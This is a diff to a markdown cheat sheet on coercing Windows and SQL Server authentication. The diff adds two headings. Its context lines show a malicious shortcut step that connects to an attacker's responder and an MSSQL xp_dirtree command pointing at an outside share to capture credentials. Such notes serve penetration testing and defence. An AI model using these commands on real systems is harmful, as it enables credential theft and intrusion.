@@ -162,7 +162,7 @@ _**[leak.application](https://www.datocms-assets.com/21957/1592982308-leak.appli
 	</dependency>
 </asmv1:assembly>
 ```
-
+## SMB
 _**[Malicious ink (SMB)]:**
 - Create a malicious that connect to our responder .
 ```sh
@@ -176,6 +176,7 @@ $lnk.HotKey = "Ctrl+Alt+O"
 $lnk.Save()
 ```
 
+## Mssql
 _**[MSSQL]:**
 ```sh
 EXEC master.sys.xp_dirtree '\\10.8.3.12\myshare',1,1
